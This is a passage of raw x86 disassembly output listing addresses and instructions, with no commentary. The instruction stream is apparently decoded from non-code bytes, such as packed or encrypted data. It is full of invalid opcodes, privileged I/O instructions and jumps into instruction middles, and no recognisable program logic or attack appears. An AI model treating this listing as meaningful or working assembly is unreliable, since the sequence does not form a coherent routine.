  414c53:	mov    esi,0x11fb24f8
  414c58:	aaa    
  414c59:	into   
  414c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c5b:	aam    0x62
  414c5d:	iret   
  414c5e:	pushf  
  414c5f:	enter  0xa5a3,0x1c
  414c63:	inc    edi
  414c64:	push   ecx
  414c65:	call   0x3037ef47
  414c6a:	and    dl,BYTE PTR [edx]
  414c6c:	xchg   BYTE PTR [ebp+ebx*4+0x66cdf027],bh
  414c73:	shl    ah,0xb3
  414c76:	ss cmp al,0xb6
  414c79:	fmul   DWORD PTR [esi+0x8]
  414c7c:	mov    eax,0xbe5c8ce
  414c81:	lods   al,BYTE PTR ds:[esi]
  414c82:	in     al,dx
  414c83:	fs add eax,0xfccedb29
  414c89:	aaa    
  414c8a:	pop    edi
  414c8b:	cmp    eax,edx
  414c8d:	addr16 test bh,0xc7
  414c91:	sub    cl,BYTE PTR [edi-0x58]
  414c94:	data16 mov bh,0x2c
  414c97:	ret    
  414c98:	lds    ebp,FWORD PTR [eax+0x5280d58f]
  414c9e:	xor    ebp,edi
  414ca0:	int3   
  414ca1:	outs   dx,BYTE PTR ds:[esi]
  414ca2:	sahf   
  414ca3:	adc    al,0x3f
  414ca5:	ss fdiv st,st(7)
  414ca8:	xor    edi,DWORD PTR [ebp-0x70e5ab92]
  414cae:	jnp    0x414d2a
  414cb0:	leave  
  414cb1:	rcr    DWORD PTR ds:0x559328c,1
  414cb7:	push   esi
  414cb8:	push   edi
  414cb9:	ja     0x414c6d
  414cbb:	xor    eax,esi
  414cbd:	xchg   BYTE PTR [ebx],bl
  414cbf:	les    esp,FWORD PTR [eax-0x45]
  414cc2:	aad    0x5a
  414cc4:	bound  edx,QWORD PTR [ebp+0x55bd4228]
  414cca:	fs sbb dh,bl
  414ccd:	jae    0x414ca4
  414ccf:	push   0xfffffff8
  414cd1:	sbb    BYTE PTR [esi],ah
  414cd3:	or     al,0x36
  414cd5:	sub    al,0x3a
  414cd7:	or     eax,0xab42872d
  414cdc:	cmc    
  414cdd:	hlt    
  414cde:	add    edx,0xffffffd0
  414ce1:	or     DWORD PTR [ebx+0x323bbc06],edx
  414ce7:	fldenv [ecx-0x41]
  414cea:	cmp    DWORD PTR [edi-0x13],0xd433adb7
  414cf1:	mov    edx,ecx
  414cf3:	xchg   eax,edi
  414cf5:	ret    
  414cf6:	arpl   WORD PTR [ebx],cx
  414cf8:	jle    0x4358cde5
  414cfe:	ss adc ah,dl
  414d01:	push   ecx
  414d02:	jb     0x414d03
  414d04:	lea    ebx,[edi+0x261f5b2e]
  414d0a:	xchg   BYTE PTR [ecx-0x5254519b],dh
  414d10:	mov    ecx,DWORD PTR [ebx+ebx*2+0x22]
  414d14:	xchg   DWORD PTR [ecx],edi
  414d16:	shl    DWORD PTR [esi],0x32
  414d19:	push   cs
  414d1a:	mov    WORD PTR [ebx],?
  414d1c:	mov    ah,0x49
  414d1e:	fisub  DWORD PTR [edx+0x1bceefd0]
  414d24:	jne    0x414d03
  414d26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d27:	mov    ebp,DWORD PTR [edi+0x4d]
  414d2a:	test   DWORD PTR [ebx+eax*4-0xe],ebx
  414d2e:	call   0xc0fba9dd
  414d33:	aam    0x98
  414d35:	xchg   ecx,eax
  414d36:	outs   dx,DWORD PTR ds:[esi]
  414d37:	inc    esi
  414d38:	aaa    
  414d39:	inc    ebx
  414d3a:	in     eax,dx
  414d3b:	adc    DWORD PTR [edx],eax
  414d3d:	xchg   ebp,eax
  414d3e:	leave  
  414d3f:	dec    ecx
  414d40:	xchg   esi,eax
  414d41:	adc    edi,esi
  414d43:	mov    dl,0x5d
  414d45:	jmp    DWORD PTR [ebp+0x7f]
  414d48:	outs   dx,BYTE PTR ds:[esi]
  414d49:	les    ebp,FWORD PTR [eax+0x57bd857e]
  414d4f:	daa    
  414d50:	mov    eax,0x346cfdbb
  414d55:	cmp    eax,0xce38fabb
  414d5a:	sbb    ch,bl
  414d5c:	aaa    
  414d5d:	dec    edx
  414d5e:	in     al,0x72
  414d60:	inc    DWORD PTR [ecx+0xa2f6ff9]
  414d66:	test   al,0xbc
  414d68:	scas   al,BYTE PTR es:[edi]
  414d69:	out    0xab,al
  414d6b:	dec    edi
  414d6c:	cdq    
  414d6d:	sub    al,0xfb
  414d6f:	fdivr  QWORD PTR [edx+0x52a30c94]
  414d75:	sbb    al,0x2f
  414d77:	retf   
  414d78:	aam    0xf
  414d7a:	jnp    0x414d13
  414d7c:	xchg   edi,eax
  414d7d:	mov    ds,WORD PTR [ecx+0x196f0cfd]
  414d83:	push   ecx
  414d84:	mov    dh,0xa
  414d86:	cld    
  414d87:	retf   
  414d88:	mov    ecx,DWORD PTR [edi+0x45]
  414d8b:	sub    BYTE PTR [ebp-0x4d],ch
  414d8e:	add    eax,0xf942c7b
  414d93:	push   cs
  414d94:	pop    dx
  414d96:	test   BYTE PTR [ecx+0x5c],dl
  414d99:	xchg   edi,edx
  414d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d9c:	leave  
  414d9d:	add    dl,BYTE PTR [ebx-0x20]
  414da0:	sub    eax,0x7003eb0a
  414da5:	out    0x90,al
  414da7:	(bad)  
  414da9:	(bad)  
  414daa:	aaa    
  414dab:	dec    ebx
  414dac:	jp     0x414dfa
  414dae:	cmp    ah,cl
  414db0:	or     dl,BYTE PTR [esp+ebx*1]
  414db3:	jne    0x414d74
  414db5:	jl     0x414d4b
  414db7:	cmp    DWORD PTR ds:0x132c94fa,ebx
  414dbd:	(bad)  
  414dbe:	xor    esi,DWORD PTR [ebx+edi*4+0x62]
  414dc2:	test   eax,0xd4bfd2fc
  414dc7:	dec    ecx
  414dc8:	xchg   al,al
  414dca:	jnp    0x414e44
  414dcc:	jmp    0x414da4
  414dce:	xchg   DWORD PTR [esi-0x15c2e25d],ebx
  414dd4:	retf   
  414dd5:	mov    edi,0x9eefb41b
  414dda:	leave  
  414ddb:	lds    esi,FWORD PTR [eax+0xf]
  414dde:	aaa    
  414ddf:	add    DWORD PTR [eax-0x6f],edx
  414de2:	push   ebx
  414de3:	mov    ah,0x3d
  414de5:	pop    edi
  414de6:	loope  0x414e12
  414de8:	adc    eax,0x43fc2666
  414ded:	mov    ebp,0x83546ae1
  414df2:	ds ret 
  414df4:	shr    BYTE PTR [edi+eiz*1-0x31],1
  414df8:	add    BYTE PTR [ecx+0x2a],bh
  414dfb:	push   esp
  414dfc:	call   0x3eb47d6
  414e01:	bound  edi,QWORD PTR [eax+0x2b5e9f62]
  414e07:	sub    BYTE PTR [eax+eiz*2+0x74],ah
  414e0b:	sar    DWORD PTR [ebx+0x16],1
  414e0e:	sbb    BYTE PTR [ebx+0x37],0xfb
  414e12:	xchg   ecx,eax
  414e13:	inc    eax
  414e14:	pop    ebp
  414e15:	xor    cl,BYTE PTR [eax+0x4e0c4135]
  414e1b:	fidiv  DWORD PTR [edi-0x1d96c70d]
  414e21:	arpl   di,si
  414e23:	inc    DWORD PTR [esi+0x4275a6f1]
  414e29:	aam    0xe0
  414e2b:	es push eax
  414e2d:	es je  0x414e23
  414e30:	pop    edx
  414e31:	add    bh,BYTE PTR [esi-0x13]
  414e34:	push   ss
  414e35:	jg     0x414e00
  414e37:	mov    al,0xad
  414e39:	cdq    
  414e3a:	sub    eax,0x4e1a86b1
  414e3f:	sbb    al,0x57
  414e41:	in     al,0x23
  414e43:	jnp    0x414e0f
  414e45:	call   0x523b50
  414e4a:	push   esp
  414e4b:	pop    ebx
  414e4c:	fsub   DWORD PTR [esp+edi*8]
  414e4f:	adc    dh,BYTE PTR [ebp+0x17c0d3ea]
  414e55:	aas    
  414e56:	xchg   esi,eax
  414e57:	outs   dx,BYTE PTR ds:[esi]
  414e58:	adc    ebx,DWORD PTR ds:0xe49d6060
  414e5e:	enter  0xd8bb,0x2a
  414e62:	aam    0xeb
  414e64:	mov    edi,0xddc66a83
  414e69:	push   edi
  414e6a:	or     DWORD PTR [eax-0x1c6fde74],esi
  414e70:	(bad)  
  414e71:	fdivrp st(7),st
  414e73:	sbb    BYTE PTR [ecx-0x7499f72b],0xb
  414e7a:	or     bh,BYTE PTR [esi]
  414e7c:	stc    
  414e7d:	cvtpi2ps xmm3,QWORD PTR [ebx+0x6d108df7]
  414e84:	xchg   esi,eax
  414e85:	imul   edi,DWORD PTR [eax],0xa4b6ca14
  414e8b:	loop   0x414eb4
  414e8d:	aas    
  414e8e:	test   DWORD PTR [edx],ebp
  414e90:	ficom  DWORD PTR [ebx+0x10]
  414e93:	sub    eax,0x427e3cdc
  414e98:	inc    edi
  414e99:	mov    dl,cl
  414e9b:	ds mov esi,ecx
  414e9e:	jl     0x414e8a
  414ea0:	(bad)
  414ea3:	dec    esp
  414ea4:	arpl   WORD PTR [ecx-0x68b1a165],bp
  414eaa:	dec    edx
  414eab:	add    al,0x84
  414ead:	pop    ecx
  414eae:	pusha  
  414eaf:	int3   
  414eb0:	loope  0x414f13
  414eb2:	lea    ebp,[ebx+0x21a24085]
  414eb8:	push   0x106c4946
  414ebd:	inc    edi
  414ebe:	add    eax,0x40b4e3b1
  414ec3:	pop    esp
  414ec4:	inc    ecx
  414ec5:	call   0x1af:0x6c527cb9
  414ecc:	les    eax,FWORD PTR [esi+0x5280cd2a]
  414ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ed3:	stos   BYTE PTR es:[edi],al
  414ed4:	xchg   edi,eax
  414ed5:	test   DWORD PTR [ebx+0x7ad7190e],esp
  414edb:	fcom   DWORD PTR [edx+0x3]
  414ede:	jl     0x414ec0
  414ee0:	mov    esi,0xf4ac0ad0
  414ee5:	cwde   
  414ee6:	pop    eax
  414ee7:	hlt    
  414ee8:	imul   edx,DWORD PTR [eax-0x53],0x31b277e6
  414eef:	add    BYTE PTR [ebx],bh
  414ef1:	ss repz out 0x66,eax
  414ef5:	dec    edx
  414ef6:	xchg   esi,eax
  414ef7:	pop    edi
  414ef8:	or     DWORD PTR [ecx],ebx
  414efa:	js     0x414f02
  414efc:	test   BYTE PTR [eax+0xb976d8a],0x47
  414f03:	mov    ebx,0x9ec20bb9
  414f08:	imul   ecx,DWORD PTR [edx],0xef98ad3a
  414f0e:	out    dx,eax
  414f0f:	cld    
  414f10:	ret    0x9137
  414f13:	int3   
  414f14:	dec    eax
  414f15:	xchg   ecx,eax
  414f16:	push   0xb3ae758
  414f1b:	ss cmp al,0x81
  414f1e:	xor    BYTE PTR [eax+0x14],dh
  414f21:	loop   0x414f1e
  414f23:	data16 mul dh
  414f26:	jge    0x414f2a
  414f28:	sbb    ebp,DWORD PTR [eax-0x5b]
  414f2b:	mov    al,0xf3
  414f2d:	push   edi
  414f2e:	je     0x414f7c
  414f30:	cmp    edi,DWORD PTR [eax+0x7d]
  414f33:	mov    eax,ds:0x1abe2e69
  414f38:	cmp    al,BYTE PTR [edi]
  414f3a:	mov    gs,WORD PTR [edi]
  414f3c:	mov    WORD PTR [ebp-0x523f9afb],ss
  414f42:	mov    ds:0xa71dee34,al
  414f47:	ror    ecx,1
  414f49:	xchg   edi,eax
  414f4a:	mov    WORD PTR [ecx+0x40b4f8e2],cs
  414f50:	xor    ch,BYTE PTR [esi+0x7]
  414f53:	push   esi
  414f54:	cwde   
  414f55:	pop    ebp
  414f56:	test   al,0xc5
  414f58:	jne    0x414f35
  414f5a:	jne    0x414f6f
  414f5c:	hlt    
  414f5d:	ins    BYTE PTR es:[edi],dx
  414f5e:	mov    al,0x7f
  414f60:	cli    
  414f61:	in     al,dx
  414f62:	cmp    edi,DWORD PTR [esi+0x51]
  414f65:	dec    edi
  414f66:	rcl    BYTE PTR [edx],0x1d
  414f69:	mov    bh,0x6f
  414f6b:	pop    edi
  414f6c:	iret   
  414f6d:	call   0xb9c4:0xe8f9636b
  414f74:	je     0x414f0a
  414f76:	fwait
  414f77:	jns    0x414f9a
  414f79:	sub    DWORD PTR [ecx-0x3d],ebp
  414f7c:	mov    bh,0xd5
  414f7e:	adc    eax,0x1d5290c3
  414f83:	outs   dx,BYTE PTR ds:[esi]
  414f84:	dec    edi
  414f85:	push   edi
  414f86:	loop   0x414f88
  414f88:	cmp    BYTE PTR [ecx+0xa],dh
  414f8b:	cmp    DWORD PTR [eax+0x62de752c],esi
  414f91:	add    al,BYTE PTR [eax]
  414f93:	ss jl  0x414fc1
  414f96:	cmp    BYTE PTR [ebx],al
  414f98:	add    eax,edx
  414f9a:	ins    BYTE PTR es:[edi],dx
  414f9b:	scas   eax,DWORD PTR es:[edi]
  414f9c:	inc    ecx
  414f9d:	jle    0x414f65
  414f9f:	cmp    BYTE PTR [edx+0x4],cl
  414fa2:	test   al,cl
  414fa4:	push   ebp
  414fa5:	xlat   BYTE PTR ds:[ebx]
  414fa6:	jne    0x414f8b
  414fa8:	cmp    bh,BYTE PTR [eax-0x46dbd126]
  414fae:	out    0x3d,eax
  414fb0:	stos   BYTE PTR es:[edi],al
  414fb1:	(bad)  
  414fb2:	cmc    
  414fb3:	inc    edx
  414fb4:	xchg   edi,eax
  414fb5:	in     eax,dx
  414fb6:	popf   
  414fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fb8:	jne    0x414fba
  414fba:	outs   dx,BYTE PTR ds:[esi]
  414fbb:	cli    
  414fbc:	sahf   
  414fbd:	mov    bh,0x17
  414fbf:	lds    eax,FWORD PTR [edi+0x79]
  414fc2:	rcr    DWORD PTR [edx+0x6ea729b6],1
  414fc8:	stos   BYTE PTR es:[edi],al
  414fc9:	es jecxz 0x414f87
  414fcc:	inc    eax
  414fcd:	or     esi,DWORD PTR [esi-0x5affb88b]
  414fd3:	inc    edx
  414fd4:	lock push esp
  414fd6:	xchg   esp,eax
  414fd7:	ret    
  414fd8:	push   edx
  414fd9:	jae    0x414f9d
  414fdb:	out    dx,eax
  414fdc:	xor    ebx,ecx
  414fde:	sbb    dl,bl
  414fe0:	in     eax,dx
  414fe1:	dec    ebp
  414fe2:	ror    BYTE PTR [eax],1
  414fe4:	adc    cl,al
  414fe6:	hlt    
  414fe7:	xchg   ecx,eax
  414fe8:	push   ebp
  414fe9:	pop    es
  414fea:	(bad)  
  414feb:	mov    bl,0x40
  414fed:	sar    DWORD PTR [ebp-0x7d83512d],0xa
  414ff4:	outs   dx,BYTE PTR ds:[esi]
  414ff5:	fmul   DWORD PTR [esi-0x1f610f3c]
  414ffb:	loopne 0x414f8c
  414ffd:	mov    cl,0x50
  414fff:	or     edx,0xb1c4c806
  415005:	sub    DWORD PTR [ebx],eax
  415007:	cli    
  415008:	es push es
  41500a:	mov    esp,0xf39617b8
  41500f:	in     al,dx
  415010:	ja     0x414fab
  415012:	or     BYTE PTR [edx+esi*1+0x632a8995],0x7
  41501a:	add    ebp,ecx
  41501c:	push   ecx
  41501d:	sbb    BYTE PTR [bx],0x46
  415021:	jo     0x414fb0
  415023:	loop   0x414ff2
  415025:	call   0x4acd:0x3b291808
  41502c:	inc    edi
  41502d:	push   0xbd35ba90
  415032:	(bad)
  415035:	enter  0x347b,0xef
  415039:	mov    esi,0xa684374
  41503e:	(bad)  
  415040:	cwde   
  415041:	push   edi
  415042:	shl    DWORD PTR [ecx+ebp*1-0x14],0x52
  415047:	icebp  
  415048:	sub    bh,BYTE PTR [ecx]
  41504a:	iret   
  41504b:	and    eax,0xa8d1b237
  415050:	stc    
  415051:	call   0xb7f7b2aa
  415056:	sub    dl,BYTE PTR [ecx+0x1cb8c2f6]
  41505c:	test   DWORD PTR [edx-0x711bca9f],ecx
  415062:	fist   DWORD PTR [ebx]
  415064:	lods   eax,DWORD PTR ds:[esi]
  415065:	(bad)  
  415066:	dec    esi
  415067:	xor    edi,ebp
  415069:	cmpxchg BYTE PTR [ebp+eax*1+0x2fd37013],cl
  415071:	retf   
  415072:	(bad)  
  415073:	cmp    bh,BYTE PTR [ebx]
  415075:	xchg   cl,dl
  415077:	outs   dx,BYTE PTR ds:[esi]
  415078:	div    DWORD PTR [ebx+eiz*4]
  41507b:	xchg   ebx,eax
  41507c:	(bad)  
  41507d:	sub    eax,0x72fc11e6
  415082:	sbb    dl,BYTE PTR [ebp+esi*4+0x17]
  415086:	cmc    
  415087:	inc    ebp
  415088:	sub    DWORD PTR [ebp+0xf5bc7cb],edi
  41508e:	inc    ebx
  41508f:	test   BYTE PTR [ecx-0x59],al
  415092:	pop    edi
  415093:	mov    edx,0xcd7c5f3b
  415098:	imul   esp,DWORD PTR [eax-0x5bf685ed],0x8c926ec8
  4150a2:	jg     0x41504e
  4150a4:	sub    al,bl
  4150a6:	mov    al,BYTE PTR [esi-0x682c1da3]
  4150ac:	xor    BYTE PTR [edx],cl
  4150ae:	daa    
  4150af:	mov    cl,0x20
  4150b1:	loope  0x41505c
  4150b3:	pop    eax
  4150b4:	daa    
  4150b5:	push   0xffffffc8
  4150b7:	or     al,0xca
  4150b9:	(bad)  
  4150ba:	bound  ebx,QWORD PTR [edx]
  4150bc:	scas   al,BYTE PTR es:[edi]
  4150bd:	and    BYTE PTR gs:[edi+0x16],0x3f
  4150c2:	lahf   
  4150c3:	aaa    
  4150c4:	push   edx
  4150c5:	gs inc sp
  4150c8:	jae    0x41510e
  4150ca:	pusha  
  4150cb:	test   DWORD PTR [ebx],esi
  4150cd:	jnp    0x4150b2
  4150cf:	fwait
  4150d0:	icebp  
  4150d1:	and    al,0xce
  4150d3:	dec    ebp
  4150d4:	sbb    edx,ebp
  4150d6:	sub    eax,0x6715fde3
  4150db:	leave  
  4150dc:	test   al,0x50
  4150de:	adc    ch,BYTE PTR [eax+0x134ea897]
  4150e4:	ret    0xe18a
  4150e7:	jmp    0x4150b8
  4150e9:	dec    edi
  4150ea:	test   eax,0xe0bf2
  4150ef:	mov    esp,0x23128a3c
  4150f4:	pop    es
  4150f5:	add    eax,0xb8648dee
  4150fa:	and    eax,0xeb904657
  4150ff:	dec    esp
  415100:	lock jge 0x4150f3
  415103:	mov    BYTE PTR [edi-0x9],bl
  415106:	ret    
  415107:	ror    al,1
  415109:	add    eax,0x3916c010
  41510e:	xor    edx,DWORD PTR [edx-0x55]
  415111:	sub    dl,dh
  415113:	jecxz  0x41513c
  415115:	fbld   TBYTE PTR ds:0x318eed55
  41511b:	mov    dl,0x8e
  41511d:	popf   
  41511e:	fbld   TBYTE PTR [esi+0x63]
  415121:	aad    0xbf
  415123:	stc    
  415124:	xchg   DWORD PTR [ebp+0x23a2db81],ebp
  41512a:	jmp    0x777f:0xc779ae8b
  415131:	ret    
  415132:	xor    DWORD PTR ss:[edx+edi*1+0x54],eax
  415137:	jecxz  0x41518a
  415139:	test   al,0x17
  41513b:	jns    0x4150e0
  41513d:	pop    esp
  41513e:	inc    esi
  41513f:	rcl    BYTE PTR [ecx],cl
  415141:	jge    0x4151a6
  415143:	sbb    BYTE PTR [ecx-0x17b17c2f],dl
  415149:	fidivr WORD PTR ds:0x13999c29
  41514f:	add    eax,0xee921ae7
  415154:	sbb    al,0x87
  415156:	lods   eax,DWORD PTR ds:[esi]
  415157:	or     edi,DWORD PTR [esi]
  415159:	xor    ebp,ebp
  41515b:	outs   dx,DWORD PTR ds:[esi]
  41515c:	hlt    
  41515d:	idiv   DWORD PTR ds:0xef2903b9
  415163:	push   es
  415164:	inc    edi
  415165:	lods   al,BYTE PTR ds:[esi]
  415166:	fadd   QWORD PTR [edx]
  415168:	pop    ss
  415169:	or     al,0x22
  41516b:	xlat   BYTE PTR ds:[ebx]
  41516c:	jmp    0x4150ef
  41516e:	dec    esp
  41516f:	xor    DWORD PTR [ecx+0x7d],edx
  415172:	ret    0xe68
  415175:	dec    BYTE PTR [eax-0x21d6b659]
  41517b:	cmp    eax,0x2ce0168e
  415180:	lock push ebx
  415182:	jo     0x4151ee
  415184:	int3   
  415185:	into   
  415186:	aas    
  415187:	mov    edx,0x2a64f051
  41518c:	jecxz  0x415140
  41518e:	not    dl
  415190:	ficomp WORD PTR [esi+0x2e]
  415193:	adc    esp,ebp
  415195:	leave  
  415196:	div    BYTE PTR [ebp+0x0]
  415199:	rcl    DWORD PTR [ebx-0x510a785e],cl
  41519f:	sub    eax,0xf456e945
  4151a4:	and    eax,0xc4ab1ef4
  4151a9:	fld    DWORD PTR [esi-0x4eecfd6]
  4151af:	daa    
  4151b0:	bound  esi,QWORD PTR [edx]
  4151b2:	dec    ebp
  4151b3:	int    0xed
  4151b5:	jmp    0x8264:0xee33dffa
  4151bc:	out    dx,eax
  4151bd:	je     0x415220
  4151bf:	cmc    
  4151c0:	add    BYTE PTR [ecx+eax*4-0x523f9cb9],ah
  4151c7:	sub    cl,ch
  4151c9:	mov    BYTE PTR [esi+0x34],dh
  4151cc:	es loopne 0x415242
  4151cf:	fs cld 
  4151d1:	mov    ah,0xd2
  4151d3:	ins    BYTE PTR es:[edi],dx
  4151d4:	and    dh,BYTE PTR [edi-0x586a9bc0]
  4151da:	imul   ebp,edx,0xa98bb8a6
  4151e0:	adc    DWORD PTR [ecx],esi
  4151e2:	push   es
  4151e3:	test   al,0xa
  4151e5:	sub    al,0x28
  4151e7:	in     eax,0x8b
  4151e9:	inc    eax
  4151ea:	rcl    DWORD PTR [esi+0x44],cl
  4151ed:	inc    ecx
  4151ee:	jnp    0x415190
  4151f0:	hlt    
  4151f1:	shr    BYTE PTR [edx+0x468073e1],cl
  4151f7:	enter  0x70e1,0x12
  4151fb:	jg     0x415239
  4151fd:	dec    esi
  4151fe:	fsub   st,st(3)
  415200:	dec    esi
  415201:	pop    ebp
  415202:	in     eax,dx
  415203:	pushf  
  415204:	push   es
  415205:	jp     0x415210
  415207:	fs in  eax,0xa4
  41520a:	xchg   esi,eax
  41520b:	xchg   ebx,eax
  41520c:	sbb    ch,dh
  41520e:	es jb  0x4151df
  415211:	je     0x415242
  415213:	mov    bh,0x38
  415215:	sbb    DWORD PTR [ecx-0x5],ecx
  415218:	iret   
  415219:	popf   
  41521a:	data16 and al,0x77
  41521d:	pop    esi
  41521e:	and    eax,DWORD PTR [ecx+0x28]
  415221:	push   0x6b
  415223:	mov    ebx,0xf8124ba9
  415228:	mov    bl,dh
  41522a:	or     BYTE PTR [esi+ecx*2+0x7e763b9e],bh
  415231:	aaa    
  415232:	fbstp  TBYTE PTR [edx-0x701c5fc2]
  415238:	jo     0x4151da
  41523a:	clc    
  41523b:	aam    0xb1
  41523d:	retf   
  41523e:	add    BYTE PTR [edx],al
  415240:	and    al,0x23
  415242:	jbe    0x41528c
  415244:	push   0xffffffe9
  415246:	push   cs
  415247:	mov    edi,0xf91cc199
  41524c:	bound  ecx,QWORD PTR [eax-0x4ca2fa3]
  415252:	inc    edx
  415253:	pop    ds
  415254:	xchg   esp,eax
  415255:	out    dx,al
  415256:	add    BYTE PTR [esi-0x6a],dh
  415259:	loopne 0x41524e
  41525b:	add    edi,DWORD PTR [ebx-0x45]
  41525e:	das    
  41525f:	and    eax,ecx
  415261:	xlat   BYTE PTR ds:[ebx]
  415262:	cld    
  415263:	mov    esp,0x5e7f5d6e
  415268:	push   es
  415269:	sbb    cl,ch
  41526b:	pop    edx
  41526c:	test   eax,0x21dd1e12
  415271:	adc    eax,0x2d718398
  415276:	add    BYTE PTR [ecx],ah
  415278:	ja     0x415289
  41527a:	inc    edi
  41527b:	fadd   DWORD PTR [ecx]
  41527d:	fnstcw WORD PTR [ebx+0x2831225f]
  415283:	daa    
  415284:	(bad)  [edi+0x59]
  415287:	sub    DWORD PTR [ecx-0xe212925],ebp
  41528d:	test   BYTE PTR [eax+0x48],bl
  415290:	mov    edi,0x8dc2564b
  415295:	cld    
  415296:	ds cld 
  415298:	push   ds
  415299:	jbe    0x41524d
  41529b:	jno    0x415318
  41529d:	inc    ebx
  41529e:	pop    ss
  41529f:	pop    ebp
  4152a0:	enter  0xc953,0x9e
  4152a4:	xor    DWORD PTR [ebp+ebp*1+0x1b],esi
  4152a8:	dec    eax
  4152a9:	mov    ecx,DWORD PTR [ebp-0x4350f8fd]
  4152af:	mov    dh,0x51
  4152b1:	sub    esi,edx
  4152b3:	mov    WORD PTR [esi],?
  4152b5:	not    DWORD PTR ds:0x541951b1
  4152bb:	(bad)  
  4152bc:	jb     0x4152ae
  4152be:	out    0xc7,al
  4152c0:	lods   eax,DWORD PTR ds:[esi]
  4152c1:	ficom  DWORD PTR [edi+0x30]
  4152c4:	adc    eax,0x78d4caf7
  4152c9:	icebp  
  4152ca:	and    al,0x8f
  4152cc:	mov    esi,0xaf6731c5
  4152d1:	push   es
  4152d2:	test   al,0x93
  4152d4:	sub    ebp,DWORD PTR [eax+0x5af0525d]
  4152da:	jmp    0x415317
  4152dc:	imul   DWORD PTR es:[ecx-0x4d6921]
  4152e3:	mov    edx,DWORD PTR [edi-0x68]
  4152e6:	les    ecx,FWORD PTR [ebx-0x14]
  4152e9:	add    eax,0xbd649472
  4152ee:	xchg   ebp,eax
  4152ef:	imul   edi,DWORD PTR [edi+0x38],0x18
  4152f3:	sbb    eax,0x15875cd2
  4152f8:	adc    al,0x16
  4152fa:	jmp    0x415340
  4152fc:	adc    esi,DWORD PTR [ecx+0x6946de4f]
  415302:	xor    bh,bh
  415304:	mov    BYTE PTR [edi],bh
  415306:	push   0xa593bb53
  41530b:	div    DWORD PTR [edi-0x8]
  41530e:	push   DWORD PTR [ebp-0x3789a6af]
  415314:	sub    al,dl
  415316:	jbe    0x415311
  415318:	or     al,0x81
  41531a:	sti    
  41531b:	jnp    0x41538b
  41531d:	inc    esi
  41531e:	sbb    BYTE PTR gs:[edx+0x3d190e69],ch
  415325:	dec    esi
  415326:	mov    edi,0x461c5e19
  41532b:	jae    0x415304
  41532d:	test   BYTE PTR [edi+0x4b36f30c],dh
  415333:	push   0x5
  415335:	ins    DWORD PTR es:[edi],dx
  415336:	push   ecx
  415337:	mov    bl,0x16
  415339:	dec    edi
  41533a:	cmp    BYTE PTR [ebp+ebp*4+0x25],bl
  41533e:	retf   
  41533f:	shl    BYTE PTR [ebx+edi*4-0x7a],0x2f
  415344:	xchg   edx,eax
  415345:	test   BYTE PTR [ecx+0x14],cl
  415348:	mov    BYTE PTR [esi],cl
  41534a:	(bad)  
  41534b:	sub    al,0x31
  41534d:	pop    edx
  41534e:	test   al,0xcb
  415350:	jmp    0x3f36:0x57caa61b
  415357:	test   DWORD PTR [esi+ebp*4+0xd],ebx
  41535b:	int3   
  41535c:	sbb    esp,DWORD PTR [edi-0x4402df85]
  415362:	sbb    al,0xc7
  415364:	adc    eax,0x1bfe0b53
  415369:	stos   DWORD PTR es:[edi],eax
  41536a:	cmp    edi,DWORD PTR [ebx-0x4c860888]
  415370:	out    0xf5,eax
  415372:	inc    esp
  415373:	aad    0xe1
  415375:	mov    al,ds:0xa7705045
  41537a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41537b:	aaa    
  41537c:	push   cs
  41537d:	and    BYTE PTR [eax],0xc8
  415380:	adc    DWORD PTR [bx+si-0x65b3],edi
  415385:	in     al,0x48
  415387:	adc    DWORD PTR ds:0xffab75d7,ebp
  41538d:	out    0xe6,al
  41538f:	dec    esp
  415390:	call   0x30513e4b
  415395:	in     al,dx
  415396:	ret    
  415397:	jb     0x415372
  415399:	mov    esi,edi
  41539b:	gs xchg ebp,eax
  41539d:	test   esi,ebp
  41539f:	push   edx
  4153a0:	cwde   
  4153a1:	and    DWORD PTR [edx],0x2a00dfa6
  4153a7:	cli    
  4153a8:	in     al,0x79
  4153aa:	and    al,0x1c
  4153ac:	mov    DWORD PTR [esi+0x685f6e88],0x2be6ebb4
  4153b6:	adc    ch,dh
  4153b8:	cdq    
  4153b9:	pop    ecx
  4153ba:	enter  0xcbcb,0xf7
  4153be:	xchg   esp,eax
  4153bf:	dec    ebp
  4153c0:	hlt    
  4153c1:	sbb    BYTE PTR [ebp+0x2f],bl
  4153c4:	fcomp  DWORD PTR [edi+ebp*1+0x10367136]
  4153cb:	out    dx,al
  4153cc:	or     eax,0x48c25786
  4153d1:	fwait
  4153d2:	xor    al,0x7c
  4153d4:	add    bh,BYTE PTR ds:0xba25ea84
  4153da:	in     eax,0xba
  4153dc:	les    esp,FWORD PTR [ebp-0x66]
  4153df:	push   cs
  4153e0:	scas   eax,DWORD PTR es:[edi]
  4153e1:	ret    
  4153e2:	jge    0x415433
  4153e4:	mov    dl,0xb6
  4153e6:	dec    ebp
  4153e7:	nop
  4153e8:	and    ch,BYTE PTR [edx]
  4153ea:	sahf   
  4153eb:	les    ebp,FWORD PTR [ebx-0x6a]
  4153ee:	icebp  
  4153ef:	clc    
  4153f0:	cli    
  4153f1:	arpl   WORD PTR [eax+edi*4+0x4fcc19bf],dx
  4153f8:	test   BYTE PTR [ebx],ah
  4153fa:	add    bh,BYTE PTR [ebx+0x72]
  4153fd:	jae    0x41546a
  4153ff:	xor    al,0x20
  415401:	and    DWORD PTR [ecx],0x4c
  415404:	fcomi  st,st(1)
  415406:	jg     0x4153bc
  415408:	xor    esi,DWORD PTR [ecx+edi*8-0x2b416fc5]
  41540f:	clc    
  415410:	jns    0x4153a1
  415412:	push   edi
  415413:	push   ecx
  415414:	push   0x7d
  415416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415417:	cmc    
  415418:	adc    BYTE PTR [ecx-0x6e2e0014],dh
  41541e:	sub    cl,BYTE PTR [ebp-0x5]
  415421:	mov    bh,dh
  415423:	dec    ecx
  415424:	sti    
  415425:	jg     0x415475
  415427:	jl     0x4153b2
  415429:	inc    edx
  41542a:	fninit 
  41542c:	and    eax,0x9248e649
  415431:	lods   al,BYTE PTR ds:[esi]
  415432:	or     dh,BYTE PTR [edi]
  415434:	or     bh,ch
  415436:	test   eax,0x5a411767
  41543b:	inc    esp
  41543c:	std    
